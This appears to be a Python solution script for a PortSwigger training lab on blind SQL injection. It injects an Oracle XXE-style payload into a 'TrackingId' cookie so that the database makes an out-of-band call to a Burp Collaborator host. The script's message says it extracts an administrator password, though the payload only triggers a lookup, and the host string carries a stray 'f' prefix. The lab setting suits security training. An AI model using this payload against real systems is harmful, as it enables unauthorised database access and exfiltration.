#########################################################################
#
# Lab: Blind SQL injection with out-of-band interaction
#
# Hack Steps: 
#      1. Inject payload into 'TrackingId' cookie to make a DNS lookup
#         to your burp collaborator domain
#      2. Check your collaborator for incoming traffic
#
#########################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a4700a804a76cc583d9116b005e00a7.web-security-academy.net"

# Change this to your burp collaborator
BURP_COLLABORATOR = "pa3gw5qad0jn77hef0jikr54vv1mpdd2.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "❯❯ Injecting payload to extract administrator password via DNS lookup.. ", end="", flush=True)

    payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://f{BURP_COLLABORATOR}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
    cookies = { "TrackingId": payload }

    try:  
       requests.get(f"{LAB_URL}/filter?category=Pets", cookies=cookies)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check the DNS lookup in your burp collaborator")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
